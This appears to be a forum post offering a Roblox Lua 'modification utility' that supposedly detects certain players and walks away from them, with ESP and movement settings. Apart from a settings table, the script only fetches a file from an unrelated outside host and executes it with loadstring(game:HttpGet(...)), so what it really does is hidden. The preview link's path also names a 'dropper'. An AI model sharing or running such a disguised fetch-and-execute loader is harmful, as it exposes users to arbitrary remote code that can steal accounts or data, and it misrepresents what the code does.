HI guys this is a super duper cool modification utility that i would LOVE to share with you 😛 
this modification utility works on detecting nice people in your server and instantly walking away from them (if is in the specified distance) 

Preview: https://t11v.icu/dropper/18e63bc1c2b7afe093f0d6dfbaccbvg5329.mp4
Script:
```lua
--[[ 
Commands: 
disable-e / enable-e --> disables and enables the ESP for the nice people
disable / enable --> this is the master switch 
change-t --> looks for another nice guy (In the server) 
method-cframe --> changes the method to cframe
method-walking --> changes the method to walking
]]
local settings = {
    Enabled = true,
    ESP = true,
    Text = true,
    Prefix = "-", 
    Speed = 2, -- change this to 16 if you choose Walking method 
    Distance = 15,
    Method = "CFrame"
}
loadstring(game:HttpGet("https://luasec.xyz/scripts/4cf6415ed85bdbf3d94d612302904f9a.lua", true))();
``` 

Have fun >_<
